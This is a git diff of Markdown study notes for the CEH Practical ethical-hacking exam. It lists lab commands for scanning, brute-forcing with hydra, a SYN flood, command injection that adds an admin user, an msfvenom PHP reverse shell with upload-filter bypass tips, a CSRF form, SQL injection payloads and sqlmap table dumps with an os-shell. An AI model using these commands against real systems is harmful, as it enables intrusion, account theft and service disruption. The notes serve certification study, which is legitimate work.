@@ -1,4 +1,4 @@
-#### CEH Practical Prep
+# CEH Practical Prep
 - nmap - https://www.stationx.net/nmap-cheat-sheet/
 - sqlmap - https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/
 - wireshark - https://unit42.paloaltonetworks.com/using-wireshark-display-filter-expressions/
@@ -9,20 +9,23 @@
 - responder - https://notsosecure.com/pwning-with-responder-a-pentesters-guide/
 - CEHv10 iLAB Videos  https://www.youtube.com/playlist?list=PLWGnVet-gN_kGHSHbWbeI0gtfYx3PnDZO
 - Ethical Hacking Labs -https://github.com/Samsar4/Ethical-Hacking-Labs
-TryHackMe Rooms
+
+###### TryHackMe Rooms
 - WebAppSec101 - https://tryhackme.com/room/webappsec101
 - Daily Bugle - https://tryhackme.com/room/dailybugle
 - Hydra - https://tryhackme.com/room/hydra
 - CrackTheHash - https://tryhackme.com/room/crackthehash
 
+
+####### Discovery
 netdiscover -i eth0
 fping -a -g subnet 2>/dev/null
 nmap -p- 10.10.10.10
-
 nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10
+nmap -sC -sV 10.10.10.10
+
 
 gobuster -e -u http://10.10.10.10 -w wordlsit.txt
-
 dirb http://10.10.10.10 wordlist.txt
 
 SQLi manually
@@ -40,7 +43,8 @@ https://github.com/Dormidera/WordList-Compendium
 https://datarecovery.com/rd/default-passwords/
 https://github.com/danielmiessler/SecLists
 
-cewl example.com -m 5 -w words.txt
+cewl is grabbing words from webpage 
+cewl example.com -m 5 -w words.txt 
 
 Brute Force services
 
@@ -54,134 +58,134 @@ hydra
     hydra -l root -P passwords.txt <IP> ssh
     
 searchsploit
+ - searchsploit “Linux Kernel”
+ - searchsploit -m 7618 — Paste the exploit in the current directory
+ - searchsploit -p 7618[.c] — Show complete path
+ - searchsploit — nmap file.xml — Search vulns inside a Nmap XML result
 
-    searchsploit “Linux Kernel”
-    searchsploit -m 7618 — Paste the exploit in the current directory
-    searchsploit -p 7618[.c] — Show complete path
-    searchsploit — nmap file.xml — Search vulns inside a Nmap XML result
+###### Tools that are used in the iLABS
 
-#### Tools that are used in the iLABS
-
-Module 2 - Footprinting and Reconaisance 
-    tracert/traceroute
-    ping
-    firebug plugin (old) for browser (same as web developer tools)
-    httrack to mirror a site.
-    path analyzer pro
-    metasploit - service postgresql start 
-               - msfconsole
-               - db_status
-               - msfdb init
-               - service postgresql restart
-               - nmap -Pn -sS -A -oX test 10.10.10.0/24
-               - db_import Test
-               - hosts
-               - db_nmap -sS -A 10.10.10.16
-               - services
-               - use scanner/smb/smb_version
-               - set RHOSTS 10.10.10.8-16
-               - set THREADS 100
-               - run
-               - os_flavor
+###### Module 2 - Footprinting and Reconaisance 
+tracert/traceroute
+ping
+firebug plugin (old) for browser (same as web developer tools)
+httrack to mirror a site.
+path analyzer pro
+metasploit 
+    - service postgresql start 
+    - msfconsole
+    - db_status
+    - msfdb init
+    - service postgresql restart
+    - nmap -Pn -sS -A -oX test 10.10.10.0/24
+    - db_import Test
+    - hosts
+    - db_nmap -sS -A 10.10.10.16
+    - services
+    - use scanner/smb/smb_version
+    - set RHOSTS 10.10.10.8-16
+    - set THREADS 100
+    - run
+    - os_flavor
                
-Module 4 - Enumeration
-    GNI (Global Network Inventory
-    Advanced IP Scanner
-    SuperScan
-    Hyena
-    NetBios Enumerator
-    SoftPerfect Netowrk Scanner
-    NMAP
-    ZenMAP
-    nbtstat
-    net use
-    nmap -sP  10.10.10.0/24 ping sweet
-    nmap -sS 10.10.10.0/24 stealth scan
-    nmap -sSV -O synscan with OS detection
-    nmap -sSV -O -oN enumeration.txt
-    nmap -sU -p 161 10.10.10.0/24
-    nmap -sU -p 161 --script=snmp-brute 10.10.10.12
-    msfconsole
-                - use auxiliry/scanner/snmp/snmp_login
-                - set RHOSTS 10.10.10.12
-                - run
-                - use auxiliary/scanner/snmp/snmp_enum
-                - set RHOSTS 10.10.10.12
-                - run
-    LDAP
-    ADExplorer
-    enum4linux -u user -p passwd -U 10.10.10.12 - full output
-    enum4linux -u user -p passwd -o 10.10.10.12 OS version
-    enum4linux -u user -p passwd -P 10.10.10.12 password policy
-    enum4linux -u user -p passwd -G 10.10.10.12 groups
-    enum4linux -u user -p passwd -S 10.10.10.12 share policy 
+###### Module 4 - Enumeration
+   GNI (Global Network Inventory
+   Advanced IP Scanner
+   SuperScan
+   Hyena
+   NetBios Enumerator
+   SoftPerfect Netowrk Scanner
+   NMAP
+   ZenMAP
+   nbtstat
+   net use
+   nmap -sP  10.10.10.0/24 ping sweet
+   nmap -sS 10.10.10.0/24 stealth scan
+   nmap -sSV -O synscan with OS detection
+   nmap -sSV -O -oN enumeration.txt
+   nmap -sU -p 161 10.10.10.0/24
+   nmap -sU -p 161 --script=snmp-brute 10.10.10.12
+   msfconsole
+     - use auxiliry/scanner/snmp/snmp_login
+     - set RHOSTS 10.10.10.12
+     - run
+     - use auxiliary/scanner/snmp/snmp_enum
+     - set RHOSTS 10.10.10.12
+     - run
+   LDAP
+   ADExplorer
+   enum4linux -u user -p passwd -U 10.10.10.12 full output
+   enum4linux -u user -p passwd -o 10.10.10.12 OS version
+   enum4linux -u user -p passwd -P 10.10.10.12 password policy
+   enum4linux -u user -p passwd -G 10.10.10.12 groups
+   enum4linux -u user -p passwd -S 10.10.10.12 share policy 
     
-    Module 5 - Vulnerability Analysis
+ ###### Module 5 - Vulnerability Analysis
     
-    Nessus
-    Nikto -h 10.10.10.12 -Tuning 1
+   Nessus
+   Nikto -h 10.10.10.12 -Tuning 1
     
-    Chapter 6 - System hacking
+###### Module 6 - System hacking
     
-    RainbowCrack
-    Whitespace Stego
-    Snow
-    Image Stego
-    OpenStego
-    QuickStego
+   RainbowCrack
+   Whitespace Stego
+   Snow
+   Image Stego
+   OpenStego
+   QuickStego
     
-    Module 9 - Social Engineering
+###### Module 9 - Social Engineering
     
-    SET toolkit
+   SET toolkit
     
-    Module 10 - Denial of Service
+###### Module 10 - Denial of Service
     
-    wireshark - tcp filter
-    hping3 -S 10.10.10.10 -a 10.10.10.11 -p 22 --flood
-    HOIC (high orbit Ion Cannon)
+   wireshark - tcp filter
+   hping3 -S 10.10.10.10 -a 10.10.10.11 -p 22 --flood
+   HOIC (high orbit Ion Cannon)
     
-    Module 11 - Session Hijacking
+###### Module 11 - Session Hijacking
     
-    OWASP ZAP
-    Burpsuite
+   OWASP ZAP
+   Burpsuite
     
-    Module 12 - Hacking Web Servers
+###### Module 12 - Hacking Web Servers
     
-    skipfish -o /root/test -S /usr/share/skipfish/dictionaries/complete.wl http://10.10.10.12
-    httprecon
-    ID Serve
-    nmap -p 21 10.10.10.12
-    ftp 10.10.10.12
-    anonymous
-    test@test.com
-    hydra -L /root/Desktop/Wordlists/Usernames.txt -P root/Desktop/Wordlists/Passwords.txt ftp://10.10.10.12
-    uniscan -u http://10.10.10.12
-    uniscan -u http://10.10.10.12 -we (robots.txt and sitemap.txt
-    uniscan -u http://10.10.10.12 -d dynamic scan (blind SQL)
+   skipfish -o /root/test -S /usr/share/skipfish/dictionaries/complete.wl http://10.10.10.12
+   httprecon
+   ID Serve
+   nmap -p 21 10.10.10.12
+   ftp 10.10.10.12
+    - anonymous
+    - test@test.com
+   hydra -L /root/Desktop/Wordlists/Usernames.txt -P root/Desktop/Wordlists/Passwords.txt ftp://10.10.10.12
+   uniscan -u http://10.10.10.12
+   uniscan -u http://10.10.10.12 -we (robots.txt and sitemap.txt
+   uniscan -u http://10.10.10.12 -d dynamic scan (blind SQL)
     
-    Module 14 Hacking Web Applications
+###### Module 14 Hacking Web Applications
     
-    parameter  tampering
+   parameter  tampering
     When logged into site with user the following url will show in the address bar 
-        http://10.10.10.12/viewprofile.aspx?id=2
-        change it to
-        http://10.10.10.12/viewprofile.aspx?id=1
+    http://10.10.10.12/viewprofile.aspx?id=2
+    change it to
+    http://10.10.10.12/viewprofile.aspx?id=1
     
-    Cross Site Scripting (XSS or CSS)
-    <script>alert("XSS Alert")</script>
+   Cross Site Scripting (XSS or CSS)
+   <script>alert("XSS Alert")</script>
     
-    wpscan --url 10.10.10.12 --enumerate u
+   wpscan --url 10.10.10.12 --enumerate u
     
-    msfconsole
-        use/auxiliary/scanner/http/wordpress_login_enum
-        set PASS_FILE passwords.txt
-        set RHOSTS 10.10.10.12
-        set RPORT 80
-        set TARGETURI http://10.10.10.12/wordpress
-        set USERNAME admin
-        run
+   msfconsole
+    - use/auxiliary/scanner/http/wordpress_login_enum
+    - set PASS_FILE passwords.txt
+    - set RHOSTS 10.10.10.12
+    - set RPORT 80
+    - set TARGETURI http://10.10.10.12/wordpress
+    - set USERNAME admin
+    - run
      
-   DVWA
+   DVWA (damn vulnerable web app)
    
   command injection
     ping | hostname
@@ -189,19 +193,18 @@ Module 4 - Enumeration
     ping | net user TestUser /add
     ping | net localgroup Administrators TestUser /add
     
-    Vega
-    Acunetix
+   Vega
+   Acunetix
     
    msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=4444 -f raw > shell.php
-    msfconsole
-        use/multi/handler
-        set payload php/meterpreter/reverse_tcp
-        set lhost 10.10.10.11
-        set lport 4444
-        run
-        
+   msfconsole
+    - use/multi/handler
+    - set payload php/meterpreter/reverse_tcp
+    - set lhost 10.10.10.11
+    - set lport 4444
+    - run
    when shell connects
-    sysinfo
+    - sysinfo
     
    if .php doesn't upload and says only images like .jpg, .jpeg, .png only allowed rename shell.php to shell.php.jpg
    if that doesn't work, rename to shell.php
@@ -211,54 +214,41 @@ Module 4 - Enumeration
    
    Upload CSRF
     
-    wpscan -u http://10.10.10.12 --enumerate vp
+   wpscan -u http://10.10.10.12 --enumerate vp
+   
+   <form  method="POST" action="https://10.10.10.12/wp-admin/options-general.php?page=wordpress-firewall-2%2Fwordpress-firewall-2.php"><script>alert("As an Admin, To Enable additional security to your website. Click Submimt")</script><input type="hidden" name="whitelisted_ip[]" value="10.10.10.11">
+   <input type="hidden" name="set_whitelist_ip" value="Set Whitelist IPs" class="button-secondary">
+   <input type="submit">
+   </form>
+   save as Security_Script.html
     
-    <form  method="POST" action="https://10.10.10.12/wp-admin/options-general.php?page=wordpress-firewall-2%2Fwordpress-firewall-2.php"><script>alert("As an Admin, To Enable additional security to your website. Click Submimt")</script><input type="hidden" name="whitelisted_ip[]" value="10.10.10.11">
-    <input type="hidden" name="set_whitelist_ip" value="Set Whitelist IPs" class="button-secondary">
-    <input type="submit">
-    </form>
-    save as Security_Script.html
     
+####### Module 15 - SQL Injection
     
-    Module 15 - SQL Injection
+   blah' or 1=1 --
+   blah';insert into login values('jon','pass'); --
+   blah';create database newdb; --
+   blah';'exec master_xp_cmdshell 'ping 10.10.10.12 -l 65000 -t; --
     
-    blah' or 1=1 --
-    blah';insert into login values('jon','pass'); --
-    blah';create database newdb; --
-    blah';'exec master_xp_cmdshell 'ping 10.10.10.12 -l 65000 -t; --
+   NStalker
     
-    NStalker
-    
-    inspect element
-        console
-           document.cookie
+   inspect element
+   console
+   document.cookie
            
-    sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> --dbs
-    sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> -D dbname --tables
-    sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> -D dbname -T user_login_table --columns
-    sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> -D dbname -T user_login_table --dump
-    sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> --os-shell
+   sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> --dbs
+   sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> -D dbname --tables
+   sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> -D dbname -T user_login_table --columns
+   sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> -D dbname -T user_login_table --dump
+   sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> --os-shell
     
     
-    Module 20 - Cryptography
+###### Module 20 - Cryptography
     
-    HashCalc
-    md5calc
-    cryptoforge
-    BCTextEncoder
-    IIS Self Signed Certs
-    VeraCrypt
-    CrypTool
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-
-
-
+   HashCalc
+   md5calc
+   cryptoforge
+   BCTextEncoder
+   IIS Self Signed Certs
+   VeraCrypt
+   CrypTool
